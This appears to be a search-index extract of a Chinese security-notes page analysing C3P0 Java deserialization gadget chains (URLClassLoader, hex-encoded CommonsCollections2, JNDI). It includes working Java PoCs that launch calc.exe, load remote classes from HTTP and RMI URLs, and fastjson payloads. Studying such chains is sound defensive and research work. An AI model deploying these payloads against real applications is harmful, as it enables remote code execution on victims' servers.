parseUserOverridesAsString\u4f1a\u5148\u628auserOverrideAsString\u5c5e\u6027\u8fdb\u884c\u622a\u53d6\uff08\u4e5f\u5c31\u662f\u4e0a\u56fe\u4e2duserOverrideAsString\u5c5e\u6027\u4e2dHexAsciiSerializedMap\u540e\u9762\u7684\u90e8\u5206\uff09\uff0c\u7136\u540e\u5c06\u5176\u89c6\u4e3a\u5341\u516d\u8fdb\u5236\u6570\u636e\u8f6c\u5316\u6210byte\uff0c\u7136\u540e\u8c03\u7528SerializableUtils.fromByteArray\u5bf9\u5176\u8fdb\u884c\u5904\u7406 SerializableUtils.fromByteArray\u4f1a\u5bf9byte\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\u3002 \u5728fastjson\uff0cjackson\u7b49\u73af\u955c\u4e0b\uff0cuserOverridesAsString\u5c5e\u6027\u53ef\u63a7\uff0c\u5bfc\u81f4\u53ef\u4ee5\u4ece\u5176setter\u65b9\u6cd5setuserOverridesAsString\u5f00\u59cb\u5230\u6700\u540edeserializeFromByteArray\u5bf9\u5176\u8c03\u7528readObject\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u9020\u6210\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002 POC \u7528cc2\u94fe\u6253\u7684 import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; public class c3p { public static void main(String[] args) throws Exception{ PriorityQueue a = go(); ObjectOutputStream ser0 = new ObjectOutputStream(new FileOutputStream(new File(\"a.bin\"))); ser0.writeObject(a); ser0.close(); InputStream in = new FileInputStream(\"a.bin\"); byte[] bytein = toByteArray(in); String Hex = \"HexAsciiSerializedMap:\"+bytesToHexString(bytein,bytein.length)+\"p\"; WrapperConnectionPoolDataSource exp = new WrapperConnectionPoolDataSource(); exp.setUserOverridesAsString(Hex); ObjectOutputStream ser = new ObjectOutputStream(new FileOutputStream(new File(\"b.bin\"))); ser.writeObject(exp); ser.close(); ObjectInputStream unser = new ObjectInputStream(new FileInputStream(\"b.bin\")); unser.readObject(); unser.close(); } public static PriorityQueue go() throws Exception{ ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc.exe\"})}); TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,comparator); return queue; } public static byte[] toByteArray(InputStream in) throws IOException { byte[] classBytes; classBytes = new byte[in.available()]; in.read(classBytes); in.close(); return classBytes; } public static String bytesToHexString(byte[] bArray, int length) { StringBuffer sb = new StringBuffer(length); for(int i = 0; i < length; ++i) { String sTemp = Integer.toHexString(255 & bArray[i]); if (sTemp.length() < 2) { sb.append(0); } sb.append(sTemp.toUpperCase()); } return sb.toString(); } } fastjson exp { \"a\": { \"@type\": \"java.lang.Class\", \"val\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" }, \"b\": { \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\", \"userOverridesAsString\": \"HexAsciiSerializedMap:hex\u7f16\u7801\u5185\u5bb9;\" } } \u603b\u7ed3 \u5728fastjson\uff0cjackson\u73af\u5883\u4e2d\u53ef\u7528\uff0c\u6bd4\u8d77\u4e0b\u6587JNDI Gadget\uff0c\u6b64Gadget\u66f4\u9002\u5408\u5728\u4e0d\u51fa\u7f51\u73af\u5883\u4e0b\u5229\u7528 WrapperConnectionPoolDataSource\u7684\u7236\u7c7b\u4e2d\u5b58\u5728\u5c5e\u6027userOverridesAsString\u53ca\u5176setter\u65b9\u6cd5\uff0csetter\u65b9\u6cd5\u4f1a\u5c06userOverridesAsString\u4e2d\u7684\u5305\u542b\u7684Hex\u4fe1\u606f\u8f6c\u6362\u6210\u4e00\u4e2abyte\u5c5e\u6027\uff0c\u7136\u540e\u5c06\u6b64byte\u5c5e\u6027\u53cd\u5e8f\u5217\u5316\u3002 jndi \u540c\u6837\u4e5f\u662f\u5728fastjson\uff0cjackson\u73af\u5883\u4e2d\u53ef\u7528\u3002jndi\u9002\u7528\u4e8ejdk8u191\u4ee5\u4e0b\u652f\u6301reference\u60c5\u51b5 \u9996\u5148JndiRefConnectionPoolDataSource\u7c7b\u4e2d\u6709\u5c5e\u6027jndiname\u53ca\u5176setter\u65b9\u6cd5 \u5176setter\u65b9\u6cd5\u4f1a\u8c03\u7528\u5185\u90e8\u7684JndiRefForwardingDataSource\u5bf9\u8c61\u7684setJndiName\u65b9\u6cd5\uff0c\u6539\u53d8JndiRefForwardingDataSource#jndiname\u7684\u503c \u5176\u6b21JndiRefConnectionPoolDataSource\u7c7b\u4e2d\u6709LoginTimeout\u5c5e\u6027\u53ca\u5176setter\u65b9\u6cd5 \u5176setter\u65b9\u6cd5\u4f1a\u8c03\u7528\u5185\u90e8WrapperConnectionPoolDataSource\u5bf9\u8c61\u7684setLoginTimeout\u65b9\u6cd5\uff0c\u8ffd\u8e2a\u540e\u4f1a\u53d1\u73b0\u6765\u5230JndiRefForwardingDataSource#setLoginTimeout \u6211\u4eec\u8ddf\u8fdbJndiRefForwardingDataSource#inner\uff0c\u5b83\u4f1a\u8c03\u7528JndiRefForwardingDataSource#dereference\uff0c\u518d\u5ea6\u8ddf\u8fdb \u6b64\u65b9\u6cd5\u4e2d\u4f1a\u6839\u636eJndiRefForwardingDataSource#jndiName\u5c5e\u6027\u8fdb\u884clookup\u95ee\u8be2\uff0c\u800cjndiName\u5c5e\u6027\u4ece\u4e0a\u6587\u770b\u662f\u53ef\u4ee5\u88abJndiRefConnectionPoolDataSource#setter\u65b9\u6cd5\u63a7\u5236\u7684\u3002 \u90a3\u4e48\u5728fastjson\uff0cjackson\u7b49\u73af\u5883\u4e0b\uff0c\u8c03\u7528JndiRefConnectionPoolDataSource\u7c7b\u7684jndiname\uff0clogintimeout\u5c5e\u6027setter\u65b9\u6cd5\uff0c\u5411jndiname\u4f20\u5165\u6076\u610fRMI\u670d\u52a1\u5668\u5730\u5740\uff0c\u7136\u540e\u8c03\u7528logintimeout\u7684setter\u65b9\u6cd5\u4f7f\u53d7\u5bb3\u673a\u53bblookup\u8bbe\u7f6e\u597d\u7684jndiname\u4e2d\u7684\u6076\u610f\u5730\u5740\uff0c\u9020\u6210JNDI\u6ce8\u5165\u3002 POC public class c3p { public static void main(String[] args) throws Exception{ JndiRefConnectionPoolDataSource exp = new JndiRefConnectionPoolDataSource(); exp.setJndiName(\"rmi://127.0.0.1:10099/exp\"); exp.setLoginTimeout(1); } } fastjson exp: String poc = \"{\\\"object\\\":[\\\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\\\",{\\\"jndiName\\\":\\\"rmi://localhost:8088/Exploit\\\", \\\"loginTimeout\\\":0}]}\" \u603b\u7ed3 \u5728fastjson\uff0cjackson\u7b49\u73af\u5883\u4e0b\uff0c\u8c03\u7528JndiRefConnectionPoolDataSource\u7c7b\u7684jndiname\uff0clogintimeout\u5c5e\u6027setter\u65b9\u6cd5\uff0c\u5411jndiname\u4f20\u5165\u6076\u610fRMI\u670d\u52a1\u5668\u5730\u5740\uff0c\u7136\u540e\u8c03\u7528logintimeout\u7684setter\u65b9\u6cd5\u4f7f\u53d7\u5bb3\u673a\u53bblookup\u8bbe\u7f6e\u597d\u7684jndiname\u4e2d\u7684\u6076\u610f\u5730\u5740\uff0c\u9020\u6210JNDI\u6ce8\u5165\u3002","title":"C3P0\u94fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/C3P0%E9%93%BE/C3P0%E9%93%BE/#c3p0","text":"","title":"C3P0\u94fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/C3P0%E9%93%BE/C3P0%E9%93%BE/#_1","text":"C3P0\uff1f Gadget URLClassLoader POC \u603b\u7ed3 hex base POC \u603b\u7ed3 jndi POC \u603b\u7ed3","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/C3P0%E9%93%BE/C3P0%E9%93%BE/#c3p0_1","text":"C3P0\u662fJDBC\u7684\u4e00\u4e2a\u8fde\u63a5\u6c60\u7ec4\u4ef6 JDBC: \"JDBC\u662fJava DataBase Connectivity\u7684\u7f29\u5199\uff0c\u5b83\u662fJava\u7a0b\u5e8f\u8bbf\u95ee\u6570\u636e\u5e93\u7684\u6807\u51c6\u63a5\u53e3\u3002 \u4f7f\u7528Java\u7a0b\u5e8f\u8bbf\u95ee\u6570\u636e\u5e93\u65f6\uff0cJava\u4ee3\u7801\u5e76\u4e0d\u662f\u76f4\u63a5\u901a\u8fc7TCP\u8fde\u63a5\u53bb\u8bbf\u95ee\u6570\u636e\u5e93\uff0c\u800c\u662f\u901a\u8fc7JDBC\u63a5\u53e3\u6765\u8bbf\u95ee\uff0c\u800cJDBC\u63a5\u53e3\u5219\u901a\u8fc7JDBC\u9a71\u52a8\u6765\u5b9e\u73b0\u771f\u6b63\u5bf9\u6570\u636e\u5e93\u7684\u8bbf\u95ee\u3002\" \u8fde\u63a5\u6c60\uff1a \"\u6211\u4eec\u5728\u8bb2\u591a\u7ebf\u7a0b\u7684\u65f6\u5019\u8bf4\u8fc7\uff0c\u521b\u5efa\u7ebf\u7a0b\u662f\u4e00\u4e2a\u6602\u8d35\u7684\u64cd\u4f5c\uff0c\u5982\u679c\u6709\u5927\u91cf\u7684\u5c0f\u4efb\u52a1\u9700\u8981\u6267\u884c\uff0c\u5e76\u4e14\u9891\u7e41\u5730\u521b\u5efa\u548c\u9500\u6bc1\u7ebf\u7a0b\uff0c\u5b9e\u9645\u4e0a\u4f1a\u6d88\u8017\u5927\u91cf\u7684\u7cfb\u7edf\u8d44\u6e90\uff0c\u5f80\u5f80\u521b\u5efa\u548c\u6d88\u8017\u7ebf\u7a0b\u6240\u8017\u8d39\u7684\u65f6\u95f4\u6bd4\u6267\u884c\u4efb\u52a1\u7684\u65f6\u95f4\u8fd8\u957f\uff0c\u6240\u4ee5\uff0c\u4e3a\u4e86\u63d0\u9ad8\u6548\u7387\uff0c\u53ef\u4ee5\u7528\u7ebf\u7a0b\u6c60\u3002 \u7c7b\u4f3c\u7684\uff0c\u5728\u6267\u884cJDBC\u7684\u589e\u5220\u6539\u67e5\u7684\u64cd\u4f5c\u65f6\uff0c\u5982\u679c\u6bcf\u4e00\u6b21\u64cd\u4f5c\u90fd\u6765\u4e00\u6b21\u6253\u5f00\u8fde\u63a5\uff0c\u64cd\u4f5c\uff0c\u5173\u95ed\u8fde\u63a5\uff0c\u90a3\u4e48\u521b\u5efa\u548c\u9500\u6bc1JDBC\u8fde\u63a5\u7684\u5f00\u9500\u5c31\u592a\u5927\u4e86\u3002\u4e3a\u4e86\u907f\u514d\u9891\u7e41\u5730\u521b\u5efa\u548c\u9500\u6bc1JDBC\u8fde\u63a5\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fde\u63a5\u6c60\uff08Connection Pool\uff09\u590d\u7528\u5df2\u7ecf\u521b\u5efa\u597d\u7684\u8fde\u63a5\u3002\" C3P0\uff1a C3P0\u662f \u4e00\u4e2a\u5f00\u6e90\u7684JDBC\u8fde\u63a5\u6c60\uff0c\u5b83\u5b9e\u73b0\u4e86\u6570\u636e\u6e90\u548cJNDI\u7ed1\u5b9a\uff0c\u652f\u6301JDBC3\u89c4\u8303\u548cJDBC2\u7684\u6807\u51c6\u6269\u5c55\u3002 \u4f7f\u7528\u5b83\u7684\u5f00\u6e90\u9879\u76ee\u6709Hibernate\u3001Spring\u7b49\u3002","title":"C3P0\uff1f"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/C3P0%E9%93%BE/C3P0%E9%93%BE/#gadget","text":"C3P0\u94fe\u7684\u76f8\u5173\u4f9d\u8d56\u53ca\u7248\u672c\uff0c\u4eceysoserial\u4e2d\u53ef\u4ee5\u770b\u5230 C3P0 @mbechler c3p0:0.9.5.2, mchange-commons-java:0.2.11 pom.xml\uff0cmaven\u4e2d\u6dfb\u52a0\u6b64\u7ec4\u4ef6\u4f1a\u81ea\u52a8\u52a0\u8f7dmchange-commons-java\u8fd9\u4e2a\u5305 <dependencies> <dependency> <groupId>com.mchange</groupId> <artifactId>c3p0</artifactId> <version>0.9.5.2</version> </dependency> </dependencies>","title":"Gadget"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/C3P0%E9%93%BE/C3P0%E9%93%BE/#urlclassloader","text":"\u8fd9\u6761\u94fe\u5728\u8bb8\u591a\u6587\u7ae0\u4e2d\u4e5f\u88ab\u79f0\u4e3ahttp base\u94fe\u3002 \u5728PoolBackedDataSourceBase\u7c7b\uff08\u62bd\u8c61\u7c7b\uff09\u7684writeObject\u65b9\u6cd5\u4e2d\u6709\u5982\u4e0b\u5185\u5bb9 \u8be5\u65b9\u6cd5\u4f1a\u5c1d\u8bd5\u5c06\u5f53\u524d\u5bf9\u8c61\u7684connectionPoolDataSource\u5c5e\u6027\u8fdb\u884c\u5e8f\u5217\u5316\uff0c\u5982\u679c\u4e0d\u80fd\u5e8f\u5217\u5316\u4fbf\u4f1a\u5728catch\u5757\u4e2d\u5bf9connectionPoolDataSource\u5c5e\u6027\u7528ReferenceIndirector.indirectForm\u65b9\u6cd5\u5904\u7406\u540e\u518d\u8fdb\u884c\u5e8f\u5217\u5316\u64cd\u4f5c\u3002\u6211\u4eec\u8ddf\u8fdbReferenceIndirector.indirectForm\u65b9\u6cd5\u3002 \u6b64\u65b9\u6cd5\u4f1a\u8c03\u7528connectionPoolDataSource\u5c5e\u6027\u7684getReference\u65b9\u6cd5\uff0c\u5e76\u7528\u8fd4\u56de\u7ed3\u679c\u4f5c\u4e3a\u53c2\u6570\u5b9e\u4f8b\u5316\u4e00\u4e2aReferenceSerialized\u5bf9\u8c61\uff0c\u7136\u540e\u5c06ReferenceSerialized\u5bf9\u8c61\u8fd4\u56de\uff0cReferenceSerialized\u88ab\u5e8f\u5217\u5316\u3002 \u4e0b\u56fe\u662fReferenceSerialized\u6784\u9020\u65b9\u6cd5\uff0c\u7ed3\u5408\u4e0a\u6587\u53ef\u4ee5\u53d1\u73b0\uff0c\u5176reference\u5bf9\u8c61\u662f\u4eba\u4e3a\u53ef\u63a7\u7684\u3002 \u5c3d\u7136\u8bf4\u5230\u4e86PoolBackedDataSourceBase\u7684writeObject\u65b9\u6cd5\uff0c\u6709\u5e8f\u5217\u5316\u80af\u5b9a\u5c31\u6709\u53cd\u5e8f\u5217\u5316\uff0c\u90a3\u81ea\u7136\u800c\u7136\u5230PoolBackedDataSourceBase\u7684readObject\u65b9\u6cd5\u770b\u770b\u3002 \u53ef\u4ee5\u770b\u5230\u4f1a\u8c03\u7528\u5e8f\u5217\u6d41\u4e2d\u7684\u5bf9\u8c61\u7684getObject\u65b9\u6cd5\uff0c\u7ed3\u5408\u4e0a\u6587\uff0c\u5982\u679cReferenceSerialized\u88ab\u5e8f\u5217\u5316\u5230\u4e86\u5e8f\u5217\u6d41\u4e2d\uff0c\u90a3\u4e48\u8fd9\u91cc\u53ef\u4ee5\u662fReferenceSerialized#getObject\uff0c\u6211\u4eec\u8fdb\u884c\u8ddf\u8fdb\u3002 \u8ddf\u8fdb\u540e\u53ef\u4ee5\u53d1\u73b0\u8c03\u7528\u4e86ReferenceableUtils.referenceToObject\u8fd9\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u518d\u5ea6\u8fdb\u884c\u8ddf\u8fdb \u7531\u4e8eref\u662f\u5728\u5e8f\u5217\u5316\u7684\u65f6\u5019\u53ef\u4ee5\u63a7\u5236\u7684\u53c2\u6570\uff0c\u90a3\u4e48fClassName\u81ea\u7136\u4e5f\u662f\u53ef\u4ee5\u63a7\u5236\u7684\u5c5e\u6027\u3002 \u7ed3\u5408\u4e0b\u56fe\u9ec4\u6846\u4e2d\u7684\u5185\u5bb9\u4e0d\u96be\u53d1\u73b0\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7URLClassLoader\u5b9e\u4f8b\u5316\u8fdc\u7a0b\u7c7b\uff0c\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002","title":"URLClassLoader"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/C3P0%E9%93%BE/C3P0%E9%93%BE/#poc","text":"import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase; import com.mchange.v2.naming.ReferenceIndirector; import javax.naming.Name; import javax.naming.NamingException; import javax.naming.Reference; import javax.naming.Referenceable; import javax.sql.ConnectionPoolDataSource; import javax.sql.PooledConnection; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.rmi.Naming; import java.sql.SQLException; import java.sql.SQLFeatureNotSupportedException; import java.util.logging.Logger; public class c3p { public static void main(String[] args) throws Exception{ PoolBackedDataSourceBase a = new PoolBackedDataSourceBase(false); Class clazz = Class.forName(\"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\"); Field f1 = clazz.getDeclaredField(\"connectionPoolDataSource\"); //\u6b64\u7c7b\u662fPoolBackedDataSourceBase\u62bd\u8c61\u7c7b\u7684\u5b9e\u73b0 f1.setAccessible(true); f1.set(a,new evil()); ObjectOutputStream ser = new ObjectOutputStream(new FileOutputStream(new File(\"a.bin\"))); ser.writeObject(a); ser.close(); ObjectInputStream unser = new ObjectInputStream(new FileInputStream(\"a.bin\")); unser.readObject(); unser.close(); } public static class evil implements ConnectionPoolDataSource, Referenceable { public PrintWriter getLogWriter () throws SQLException {return null;} public void setLogWriter ( PrintWriter out ) throws SQLException {} public void setLoginTimeout ( int seconds ) throws SQLException {} public int getLoginTimeout () throws SQLException {return 0;} public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;} public PooledConnection getPooledConnection () throws SQLException {return null;} public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;} @Override public Reference getReference() throws NamingException { return new Reference(\"evilexp\",\"evilexp\",\"http://127.0.0.1:10099/\"); } } } public class evilexp { public evilexp() throws Exception{ Runtime.getRuntime().exec(\"calc\"); } }","title":"POC"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/C3P0%E9%93%BE/C3P0%E9%93%BE/#_2","text":"PoolBackedDataSource\u5728\u5e8f\u5217\u5316\u65f6\u53ef\u4ee5\u5e8f\u5217\u5316\u5165\u4e00\u4e2a\u4efb\u610fReference\u7c7b\uff0c\u5728PoolBackedDataSource\u53cd\u5e8f\u5217\u5316\u65f6\u8be5Reference\u7c7b\u4e2d\u6307\u5b9a\u7684\u5bf9\u8c61\u4f1a\u88abURLClassLoader\u8fdc\u7a0b\u52a0\u8f7d\u5b9e\u4f8b\u5316\u3002","title":"\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/C3P0%E9%93%BE/C3P0%E9%93%BE/#hex-base","text":"\u5982\u679c\u4e0d\u51fa\u7f51\uff0c\u800c\u4e14\u662ffastjson\u6216jackson\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u7528\u8fd9\u4e2aGadget\u3002 WrapperConnectionPoolDataSourceBase\u6709\u5c5e\u6027userOverridesAsString\u53ca\u5176setter\u65b9\u6cd5setuserOverridesAsString\u3002 \u8fd9\u91cc\u53ef\u4ee5\u8054\u60f3\u5230 \u63a5\u4e0b\u6765\u53ef\u80fd\u4f1a\u8c03\u7528\u4e0euserOverridesAsString\u76f8\u5173\u65b9\u6cd5 \u53ef\u4ee5\u5c1d\u8bd5\u7740\u5199\u4e2amain\u51fd\u6570\u8c03\u7528\u4e00\u4e0bsetuserOverridesAsString\u65b9\u6cd5\uff0c\u7136\u540e\u5728parseUserOverridesAsString\u6253\u4e2a\u65ad\u70b9\u8bd5\u8bd5\uff0c\u65ad\u70b9\u547d\u4e2d\u3002 \u4e3a\u4ec0\u4e48\u5728parseUserOverridesAsString\u6253\u65ad\u70b9\u5462\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u65b9\u6cd5\u4e2d\u6709\u4e0e\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\u76f8\u5173\u7684\u5b57\u773c\uff08\u9ec4\u6846\u4e2d\uff09 public static void main(String[] args) throws Exception{ a.setUserOverridesAsString(\"123\"); } parseUserOverridesAsString\u4f1a\u5148\u628auserOverrideAsString\u5c5e\u6027\u8fdb\u884c\u622a\u53d6\uff08\u4e5f\u5c31\u662f\u4e0a\u56fe\u4e2duserOverrideAsString\u5c5e\u6027\u4e2dHexAsciiSerializedMap\u540e\u9762\u7684\u90e8\u5206\uff09\uff0c\u7136\u540e\u5c06\u5176\u89c6\u4e3a\u5341\u516d\u8fdb\u5236\u6570\u636e\u8f6c\u5316\u6210byte\uff0c\u7136\u540e\u8c03\u7528SerializableUtils.fromByteArray\u5bf9\u5176\u8fdb\u884c\u5904\u7406 SerializableUtils.fromByteArray\u4f1a\u5bf9byte\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\u3002 \u5728fastjson\uff0cjackson\u7b49\u73af\u955c\u4e0b\uff0cuserOverridesAsString\u5c5e\u6027\u53ef\u63a7\uff0c\u5bfc\u81f4\u53ef\u4ee5\u4ece\u5176setter\u65b9\u6cd5setuserOverridesAsString\u5f00\u59cb\u5230\u6700\u540edeserializeFromByteArray\u5bf9\u5176\u8c03\u7528readObject\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u9020\u6210\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002","title":"hex base"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/C3P0%E9%93%BE/C3P0%E9%93%BE/#poc_1","text":"\u7528cc2\u94fe\u6253\u7684 import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; public class c3p { public static void main(String[] args) throws Exception{ PriorityQueue a = go(); ObjectOutputStream ser0 = new ObjectOutputStream(new FileOutputStream(new File(\"a.bin\"))); ser0.writeObject(a); ser0.close(); InputStream in = new FileInputStream(\"a.bin\"); byte[] bytein = toByteArray(in); String Hex = \"HexAsciiSerializedMap:\"+bytesToHexString(bytein,bytein.length)+\"p\"; WrapperConnectionPoolDataSource exp = new WrapperConnectionPoolDataSource(); exp.setUserOverridesAsString(Hex); ObjectOutputStream ser = new ObjectOutputStream(new FileOutputStream(new File(\"b.bin\"))); ser.writeObject(exp); ser.close(); ObjectInputStream unser = new ObjectInputStream(new FileInputStream(\"b.bin\")); unser.readObject(); unser.close(); } public static PriorityQueue go() throws Exception{ ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc.exe\"})}); TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,comparator); return queue; } public static byte[] toByteArray(InputStream in) throws IOException { byte[] classBytes; classBytes = new byte[in.available()]; in.read(classBytes); in.close(); return classBytes; } public static String bytesToHexString(byte[] bArray, int length) { StringBuffer sb = new StringBuffer(length); for(int i = 0; i < length; ++i) { String sTemp = Integer.toHexString(255 & bArray[i]); if (sTemp.length() < 2) { sb.append(0); } sb.append(sTemp.toUpperCase()); } return sb.toString(); } } fastjson exp { \"a\": { \"@type\": \"java.lang.Class\", \"val\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" }, \"b\": { \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\", \"userOverridesAsString\": \"HexAsciiSerializedMap:hex\u7f16\u7801\u5185\u5bb9;\" } }","title":"POC"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/C3P0%E9%93%BE/C3P0%E9%93%BE/#_3","text":"\u5728fastjson\uff0cjackson\u73af\u5883\u4e2d\u53ef\u7528\uff0c\u6bd4\u8d77\u4e0b\u6587JNDI Gadget\uff0c\u6b64Gadget\u66f4\u9002\u5408\u5728\u4e0d\u51fa\u7f51\u73af\u5883\u4e0b\u5229\u7528 WrapperConnectionPoolDataSource\u7684\u7236\u7c7b\u4e2d\u5b58\u5728\u5c5e\u6027userOverridesAsString\u53ca\u5176setter\u65b9\u6cd5\uff0csetter\u65b9\u6cd5\u4f1a\u5c06userOverridesAsString\u4e2d\u7684\u5305\u542b\u7684Hex\u4fe1\u606f\u8f6c\u6362\u6210\u4e00\u4e2abyte\u5c5e\u6027\uff0c\u7136\u540e\u5c06\u6b64byte\u5c5e\u6027\u53cd\u5e8f\u5217\u5316\u3002","title":"\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/C3P0%E9%93%BE/C3P0%E9%93%BE/#jndi","text":"\u540c\u6837\u4e5f\u662f\u5728fastjson\uff0cjackson\u73af\u5883\u4e2d\u53ef\u7528\u3002jndi\u9002\u7528\u4e8ejdk8u191\u4ee5\u4e0b\u652f\u6301reference\u60c5\u51b5 \u9996\u5148JndiRefConnectionPoolDataSource\u7c7b\u4e2d\u6709\u5c5e\u6027jndiname\u53ca\u5176setter\u65b9\u6cd5 \u5176setter\u65b9\u6cd5\u4f1a\u8c03\u7528\u5185\u90e8\u7684JndiRefForwardingDataSource\u5bf9\u8c61\u7684setJndiName\u65b9\u6cd5\uff0c\u6539\u53d8JndiRefForwardingDataSource#jndiname\u7684\u503c \u5176\u6b21JndiRefConnectionPoolDataSource\u7c7b\u4e2d\u6709LoginTimeout\u5c5e\u6027\u53ca\u5176setter\u65b9\u6cd5 \u5176setter\u65b9\u6cd5\u4f1a\u8c03\u7528\u5185\u90e8WrapperConnectionPoolDataSource\u5bf9\u8c61\u7684setLoginTimeout\u65b9\u6cd5\uff0c\u8ffd\u8e2a\u540e\u4f1a\u53d1\u73b0\u6765\u5230JndiRefForwardingDataSource#setLoginTimeout \u6211\u4eec\u8ddf\u8fdbJndiRefForwardingDataSource#inner\uff0c\u5b83\u4f1a\u8c03\u7528JndiRefForwardingDataSource#dereference\uff0c\u518d\u5ea6\u8ddf\u8fdb \u6b64\u65b9\u6cd5\u4e2d\u4f1a\u6839\u636eJndiRefForwardingDataSource#jndiName\u5c5e\u6027\u8fdb\u884clookup\u95ee\u8be2\uff0c\u800cjndiName\u5c5e\u6027\u4ece\u4e0a\u6587\u770b\u662f\u53ef\u4ee5\u88abJndiRefConnectionPoolDataSource#setter\u65b9\u6cd5\u63a7\u5236\u7684\u3002 \u90a3\u4e48\u5728fastjson\uff0cjackson\u7b49\u73af\u5883\u4e0b\uff0c\u8c03\u7528JndiRefConnectionPoolDataSource\u7c7b\u7684jndiname\uff0clogintimeout\u5c5e\u6027setter\u65b9\u6cd5\uff0c\u5411jndiname\u4f20\u5165\u6076\u610fRMI\u670d\u52a1\u5668\u5730\u5740\uff0c\u7136\u540e\u8c03\u7528logintimeout\u7684setter\u65b9\u6cd5\u4f7f\u53d7\u5bb3\u673a\u53bblookup\u8bbe\u7f6e\u597d\u7684jndiname\u4e2d\u7684\u6076\u610f\u5730\u5740\uff0c\u9020\u6210JNDI\u6ce8\u5165\u3002","title":"jndi"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/C3P0%E9%93%BE/C3P0%E9%93%BE/#poc_2","text":"public class c3p { public static void main(String[] args) throws Exception{ JndiRefConnectionPoolDataSource exp = new JndiRefConnectionPoolDataSource(); 